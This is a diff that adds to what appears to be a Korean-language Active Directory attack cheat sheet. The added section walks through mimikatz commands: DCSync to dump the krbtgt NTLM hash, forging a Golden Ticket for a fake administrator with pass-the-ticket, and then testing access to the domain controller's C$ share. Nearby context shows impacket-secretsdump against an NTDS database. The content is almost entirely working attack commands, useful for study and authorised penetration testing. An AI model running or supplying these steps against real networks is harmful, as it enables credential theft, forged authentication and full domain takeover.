@@ -195,6 +195,23 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
 ## Domain Controller Synchronization(DC Sync)
 ```powershell
+# 1. krbtgt 획득
+mimikatz # lsadump::dcsync /domain:contoso.com /user:krbtgt
+# 복사: Hash NTLM과 Object Security ID
+# 도메인 SID (RID 500 제거)
+# /sid:S-1-5-21-1234567890-1234567890-1234567890
+
+# 2. Golden Ticket 생성
+mimikatz # kerberos::golden /user:FakeAdmin /domain:contoso.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 /ptt
+
+# 3. 티켓 주입 확인
+mimikatz # kerberos::list
+
+# 4. 접근 테스트
+dir \\DC01\C$
+```
+
+```powershell
 .\mimikatz.exe
 
 # attack test
